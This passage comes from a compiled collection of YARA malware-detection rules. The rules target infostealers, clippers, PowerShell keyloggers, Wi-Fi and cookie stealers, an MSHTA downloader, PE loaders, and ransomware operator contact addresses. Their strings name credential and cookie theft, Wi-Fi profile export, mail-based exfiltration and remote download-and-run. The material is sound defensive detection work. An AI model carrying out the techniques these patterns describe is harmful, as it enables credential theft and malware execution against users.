		description = "Detects base64 encoded SVG objects containing Javascript"
		author = "marcin@ulikowski.pl"
		id = "99275772-1f4f-5616-9a9c-f76b613fe143"
		date = "2022-10-25"
		modified = "2022-12-12"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Base64_SVG_Javascript.yara#L1-L16"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "e4cb08ccc75dc00b518c4ee1495409ae6bb99e7d493be55312b8d39aa9099cfc"
		score = 75
		quality = 75
		tags = ""
		hash1 = "fe394a59e961c3fbcc326e7d0ee5909596de55249e669bc4da0aed172c11fda8"
		hash2 = "f0c94f2705b1aea17f4a6c6d71c6ed725fe71bf66b03b0117060010859ca8a19"

	strings:
		$svg = "\"data:image/svg+xml;base64" wide ascii
		$js = "<script type=\"text/javascript\">" base64

	condition:
		all of them
}

rule CRAIU_Susp_Ios_Shutdown_1
{
	meta:
		description = "Detect shutdown.log files from sysdiags with suspicious entries"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "08aa1fb9-7af0-515a-91a8-09ed35e48155"
		date = "2023-12-28"
		modified = "2024-03-05"
		reference = "https://securelist.com/shutdown-log-lightweight-ios-malware-detection-method/111734/"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/susp_ios_shutdown.yara#L2-L25"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		logic_hash = "936101f2dddb73f6dda41be47d775199c458aa4fecdcf348ed479da620343ea1"
		score = 65
		quality = 85
		tags = ""
		version = "1.0"
		tlp = "TLP:CLEAR"

	strings:
		$a1 = "these clients are still here:"
		$b1 = "/private/var/db/"
		$b2 = "/private/var/tmp/"
		$c1 = "After "

	condition:
		($c1 at 0 ) and $a1 and ( any of ( $b* ) )
}

rule DITEKSHEN_MALWARE_Win_Qulab_1
{
	meta:
		description = "Qulab information stealer payload or artifacts"
		author = "ditekSHen"
		id = "6ae24c67-5700-5330-a3bd-d542162faebb"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L959-L983"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "659d828cbef38c6362b612be9bdc05ae820f49c23684e77af6462ea677133284"
		score = 75
		quality = 75
		tags = ""
		clamav_sig = "MALWARE.Win.Trojan.QulabZ-Stealer"

	strings:
		$x1 = "QULAB CLIPPER + STEALER" ascii wide
		$x2 = "MASAD CLIPPER + STEALER" ascii wide
		$x3 = "http://teleg.run/Qulab" ascii wide
		$x4 = "http://teleg.run/jew_seller" ascii wide
		$x5 = "BUY CLIPPER + STEALER" ascii wide
		$s1 = "\\Screen.jpg" ascii wide
		$s2 = "attrib +s +h \"" ascii wide
		$s3 = "\\x86_microsoft-windows-" ascii wide
		$s4 = "\\amd64_microsoft-windows-" ascii wide
		$s5 = "Desktop TXT File" ascii wide
		$s6 = "\\AutoFills.txt" ascii wide
		$s7 = "\\CreditCards.txt" ascii wide
		$s8 = "a -y -mx9 -ssw" ascii wide
		$s9 = "\\Passwords.txt" ascii wide
		$s10 = "\\Information.txt" ascii wide
		$s11 = "\\getMe" ascii wide

	condition:
		9 of them or ( ( 1 of ( $x* ) and 4 of ( $s* ) ) or 1 of ( $x* ) )
}

rule DITEKSHEN_MALWARE_Java_Pyrogenic_1
{
	meta:
		description = "Pyrogenic/Qealler infostealer payload"
		author = "ditekSHen"
		id = "2b9268f0-2f73-51ad-ab72-9289e42e5bb1"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1434-L1446"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bb8cb939f06a376f72dcbbb1f04ec34526f72c3bcc3b146b905a8466826d2c24"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "bbb6fec5ebef0d93" ascii wide
		$s2 = "2a898bc98aaf6c96f2054bb1eadc9848eb77633039e9e9ffd833184ce553fe9b" ascii wide
		$s3 = "addShutdownHook" ascii wide
		$s4 = "obfuscated/META-INF/QeallerV" ascii wide
		$s5 = "globalIpAddress" ascii wide

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_Quilclipper_1
{
	meta:
		description = "Detects QuilClipper variants mostly in memory or extracted AutoIt script"
		author = "ditekSHen"
		id = "bd23ec5a-f21a-5133-a77a-de2615933b82"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4076-L4094"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dcac93806a438b188ae70a679301cb6630b9eb6849bf8fbbb1cea5fed5e7cf75"
		score = 75
		quality = 75
		tags = ""

	strings:
		$cnc1 = "QUILCLIPPER by" ascii
		$cnc2 = "/ UserName:" ascii
		$cnc3 = "/ System:" ascii
		$s1 = "DLLCALL ( \"kernel32.dll\" , \"handle\" , \"CreateMutexW\" , \"struct*\"" ascii
		$s2 = "SHELLEXECUTE ( @SCRIPTFULLPATH , \"\" , \"\" , FUNC_" ascii
		$s3 = "CASE BITROTATE" ascii
		$s4 = "CASE BITXOR" ascii
		$s5 = "CLIP( FUNC_" ascii
		$s6 = "CLIPPUT (" ascii
		$s7 = "FUNC _CLIPPUTFILE(" ascii
		$s8 = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Schedule" ascii

	condition:
		all of ( $cnc* ) or all of ( $s* )
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshkeylogger_1
{
	meta:
		description = "Detects PowerShell PoshKeylogger"
		author = "ditekSHen"
		id = "a816d716-caeb-5f08-9043-29db531f9e7c"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4612-L4627"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "20bde87ded7e3b68bc554c4b9a6c2ef08514f0d47b6b144763927bede81ea540"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "::GetKeyboardState" ascii
		$s2 = "GetAsyncKeyState(" ascii
		$s3 = "::MapVirtualKey(" ascii
		$s4 = "::GetAsyncKeyState" ascii
		$s5 = "Start-Sleep" ascii
		$s6 = "send-mailmessage" ascii
		$s7 = "[System.IO.File]::AppendAllText($" ascii
		$s8 = "new-object Management.Automation.PSCredential $" ascii

	condition:
		6 of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshwifistealer_1
{
	meta:
		description = "Detects PowerShell PoshWiFiStealer"
		author = "ditekSHen"
		id = "69ac123d-b746-57f1-a488-547f9a9cdd86"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4754-L4765"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "769349360b5d22226a5339a9e8471d06731dc522475c9385c1c145a0488e0ad1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "netsh wlan export profile" ascii
		$s2 = "Send-MailMessage" ascii
		$u1 = "https://github.com/axel05869/Wifi-Grab" ascii
		$u2 = "/exploitechx/wifi-password-extractor" ascii

	condition:
		all of ( $s* ) or all of ( $u* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe01_1
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "fd44f48c-7a24-512b-8375-c9f978a8b5bd"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4907-L4920"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7dd377f6a1cc48ef8ab9d53989755fb967c89d3798b721781bc09043ba3d86f4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$rp1 = "GetType('RunPe.RunPe'" ascii
		$rp2 = "GetType(\"RunPe.RunPe\"" ascii
		$rm1 = "GetMethod('Run'" ascii
		$rm2 = "GetMethod(\"Run\"" ascii
		$s1 = ".Invoke(" ascii
		$s2 = "[Reflection.Assembly]::Load(" ascii

	condition:
		all of ( $s* ) and 1 of ( $rp* ) and 1 of ( $rm* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe02_1
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "08261054-bebc-58fe-949a-27f6e817003a"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4922-L4934"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d7677689938d3e3eb6b59b99b7e347c60214f6edf8e5f83bf85da5a5f1ad33bb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "'.Replace('" ascii nocase
		$s2 = "'aspnet_compiler.exe'" ascii
		$s3 = "[Byte[]]$" ascii
		$pe1 = "(77,90," ascii
		$pe2 = "='4D5A" ascii

	condition:
		all of ( $s* ) and ( #pe1 > 1 or #pe2 > 1 ) and #s1 > 4
}

rule DITEKSHEN_MALWARE_Win_VBS_Dlagent01_1
{
	meta:
		description = "Detects VBS MSHTA downloader"
		author = "ditekSHen"
		id = "447ea323-ecab-5f6b-b13e-0690254c754e"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L5384-L5395"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e47839a55773764aca0aebcf1078c06c729b86d1e2f18d7d64e3bb11e87f3eb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "llehS.tpircsW" ascii
		$s2 = ".Run" ascii
		$s3 = "mshta http" ascii nocase
		$s4 = "StrReverse" ascii

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshcookiestealer_1
{
	meta:
		description = "Detects PowerShell PoshCookieStealer"
		author = "ditekSHen"
		id = "7326a056-288b-534b-811d-172bd6936d7b"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L9066-L9080"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "234958098d09732675dd539e8d25c6754ba50bf92b3a19e7fef8c68d70503ec4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "\\User Data\\default\\Network\\Cookies" ascii nocase
		$s2 = "Send-ToEmail" ascii
		$s3 = "[Security.Cryptography.ProtectedData]::Unprotect($" ascii
		$s4 = "$($env:LOCALAPPDATA)\\" ascii
		$s5 = "$($env:HOMEPATH)\\" ascii
		$s6 = "|ForEach-Object ToString X2) -join ''" ascii
		$s7 = ".Attachments.Add($" ascii

	condition:
		5 of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Goldenaxe_1
{
	meta:
		description = "Detects files referencing identities associated with GoldenAxe ransomware"
		author = "ditekShen"
		id = "cd6486eb-742f-50fb-bd99-c5d778886477"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L82-L91"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2540da85880dc08b51a2d096cefd8ed3cb14ccd171b71b434ccf26e7c5f1b54b"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "xxback@keemail.me" nocase ascii wide
		$s2 = "darkusmbackup@protonmail.com" nocase ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ransomwareexx_1
{
	meta:
		description = "Detects files referencing identities associated with RansomwareEXX Linux ransomware"
		author = "ditekShen"
		id = "dfcff8cb-c50c-559e-b5b9-8c2cdac7a3dc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L142-L150"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a83ada5d29c6d62a292c4b3a1379558cddcaf63d97dbdfc6afd27cc52f6f656d"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "france.eigs@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Phobos_1
{
	meta:
		description = "Detects files referencing identities associated with Phobos ransomware"
		author = "ditekShen"
		id = "cee09220-4038-5190-b595-28f67c845588"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L152-L161"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cf9e163d2315d465afb47bf83f30d5d27e14c4cbbc1c235dcb15b75fb509ba7d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "helprecover@foxmail.com" ascii wide nocase
		$s2 = "recoverhelp2020@thesecure.biz" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Epsilon_1
{
	meta:
		description = "Detects files referencing identities associated with Epsilon ransomware"
		author = "ditekShen"
		id = "acdeb3b1-872b-5892-9dfe-2e506f767da2"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L163-L171"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "163694ed2ae181764fc6e62027487d183114be35a689dd44d4d9761149df244b"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "neftet@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Thanos_1
{
	meta:
		description = "Detects files referencing identities associated with Thanos ransomware"
		author = "ditekShen"
		id = "22ffb4c9-f113-5d3e-a466-6c384c0c6e8a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L173-L182"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "039ea384136a1aaa261702ed75ab9358aaa1ec2d5a8d35fe4789647f39490c7c"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "my-contact-email@protonmail.com" ascii wide nocase
		$s2 = "get-my-data@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Vovalex_1
{
	meta:
		description = "Detects files referencing identities associated with Vovalex ransomware"
		author = "ditekShen"
		id = "95e9ddce-8a19-59f1-baf4-bdac61c9c396"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L184-L192"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e8b426e55c1efaf59e5f255f1da9cdfbb509561d3f7ea5baa2815c3131866eb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "vovanandlexus@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alumnilocker_1
{
	meta:
		description = "Detects files referencing identities associated with AlumniLocker ransomware"
		author = "ditekShen"
		id = "64b6aff8-3758-5837-b814-e2505a9c12a3"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L194-L202"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "aeab9cb2b2da246e1863cd1102d901d322017d0b309e852d83e4f66f6e4bdd22"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "alumnilocker@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Doejocrypt_1
{
	meta:
		description = "Detects files referencing identities associated with DoejoCrypt ransomware"
		author = "ditekShen"
		id = "bdf67fd3-8614-52f0-8804-9905f067a848"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L204-L213"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b76996ef413d017fa571115f7331154c808fed0f1b1e0c97241cadbbef260a00"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "konedieyp@airmail.cc" ascii wide nocase
		$s2 = "uenwonken@memail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Purge_1
{
	meta:
		description = "Detects files referencing identities associated with Purge ransomware"
		author = "ditekShen"
		id = "2a0f2c69-b179-5e48-9db6-be25e329f72b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L215-L224"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "49f3f5a88212d4bed1f0237a4437fb537e84cd6dd26c5fe224250f3b6e39d384"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "rscl@dr.com" ascii wide nocase
		$s2 = "rscl@usa.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Zeoticus_1
{
	meta:
		description = "Detects files referencing identities associated with Zeoticus ransomware"
		author = "ditekShen"
		id = "4d5f0d6d-f792-563d-9a9b-1986f5af8743"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L226-L235"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7a83b15b0c8e81f67d11f8b5d9a43ba4e1e3a0f6741ddd0daafe4e742dd91cd8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "anobtanium@tutanota.com" ascii wide nocase
		$s2 = "anobtanium@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Unlockyourfiles_1
{
	meta:
		description = "Detects files referencing identities associated with UnlockYourFiles ransomware"
		author = "ditekShen"
		id = "fdc3ec49-66cc-5a0b-87a6-3660dd6f3b72"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L279-L288"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a33dae7f08eb0c2415fbfdadf2cbbf90c68bc802352277422c6d0a2dbd62cd82"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "4lok3r@tutanota.com" ascii wide nocase
		$s2 = "4lok3r@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Darkside_1
{
	meta:
		description = "Detects files referencing identities associated with DarkSide ransomware"
		author = "ditekShen"
		id = "7b29b9b9-4657-551e-b770-880a2278ef60"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L290-L299"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3c6cdb15cad19f1db38c0fe03ecb24d5cd4861a699aa2bee0f99b8dddacc8bd1"
		score = 75
		quality = 73
		tags = ""
		hash1 = "bafa2efff234303166d663f967037dae43701e7d63d914efc8c894b3e5be9408"

	strings:
		$s1 = "breathcojunktab1987@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Spyro_1
{
	meta:
		description = "Detects files referencing identities associated with Spyro ransomware"
		author = "ditekShen"
		id = "9a42a9fd-dfaf-5719-acae-e7c3b92ecdc9"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L301-L310"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b12b24b7b1b9800d249fd322532d957ddfc020c495ca89414d8d7e9fa7d58eb7"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "blackspyro@tutanota.com" ascii wide nocase
		$s2 = "blackspyro@mailfence.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryzerlo_1
{
	meta:
		description = "Detects files referencing identities associated with Ryzerlo / HiddenTear / RSJON ransomware"
		author = "ditekShen"
		id = "1e8b79dc-4a81-5126-a7a3-ad7a2e8f62bf"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L312-L320"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2d925cac74411c3e408d674e27a27ae029d39977026a79df8f90edae345a31db"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "darkjon@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ranzylocker_1
{
	meta:
		description = "Detects files referencing identities associated with RanzyLocker ransomware"
		author = "ditekShen"
		id = "33478dc4-c0ec-5cc8-8620-79e770f6a773"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L354-L363"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dc345257a3cca82a95e20505c94e90d8ac42240e1491ea1f34be121871673e26"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "eviluser@tutanota.com" ascii wide nocase
		$s2 = "evilpr0ton@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alkhal_1
{
	meta:
		description = "Detects files referencing identities associated with AlKhal ransomware"
		author = "ditekShen"
		id = "32e14a6e-fc2e-5c0a-b8e3-33e219923d90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L365-L374"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd2d66a9cd33ab15b451158cd6c0e6579735653611ee2e6c8045a5807091938d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "alkhal@tutanota.com" ascii wide nocase
		$s2 = "cyrilga@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rapid_1
{
	meta:
		description = "Detects files referencing identities associated with Rapid ransomware"
		author = "ditekShen"
		id = "a1c6f3c0-2fec-5d96-9965-8129a843ae90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L428-L436"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ea82a3fcb1d836e1c250e9a576064e1babdb82b4970555260af2eb68726cfd16"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "jimmyneytron@tuta.io" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Satana_1
{
	meta:
		description = "Detects files referencing identities associated with Satana ransomware"
		author = "ditekShen"
		id = "a362d4ca-d475-5392-a3ac-45337425d8e7"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L438-L447"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6d82e2497044518cee1b56da85f1ad6ac7934eec9ca68501932d55add4236d45"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "adamadam@ausi.com" ascii wide nocase
		$s2 = "XsrR2he2Z8un5ysGWnJ1wveZRPRS96XEoX" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Diavol_1
{
	meta:
		description = "Detects files referencing identities associated with Diavol ransomware"
		author = "ditekShen"
		id = "ea499318-ed5b-5597-8f9f-4ece7942cf4b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L482-L491"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c72f4d7854f7ba813c4872d47aad69edb8c2927f380b9213ced1aca52454eee5"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "/noino.5fws6uqv5byttg2r//:sptth" ascii wide nocase
		$s2 = "https://r2gttyb5vqu6swf5.onion/" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Maze_1
{
	meta:
		description = "Detects files referencing identities associated with Maze ransomware"
		author = "ditekShen"
		id = "7cc11912-e5d2-5477-ab9b-0c470bb5e1d6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L513-L521"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "46070d46c502837e5fb87d0fb75244a1a21e90b4e0ce4b73c408b8dc67fe1bcb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "getmyfilesback@airmail.cc" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lokilocker_1
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
